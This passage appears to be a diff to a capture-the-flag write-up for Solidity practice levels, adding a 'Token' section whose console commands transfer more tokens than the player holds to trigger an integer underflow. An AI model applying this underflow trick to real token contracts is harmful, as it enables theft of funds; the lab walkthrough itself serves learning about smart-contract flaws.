@@ -90,3 +90,11 @@ contract TelephoneHack {
 > await contract.owner()
 < '0xedd0cCc6FeE49D502E8BfA3C6033ce0201afaD83'
 ```
+## 5. Token
+```
+> await contract.balanceOf(player)
+< 20
+> contract.transfer('0xb3785404a938323134a7bcc4679cb26bee6dd41f',21)
+
+> await contract.balanceOf(player)
+< overflow
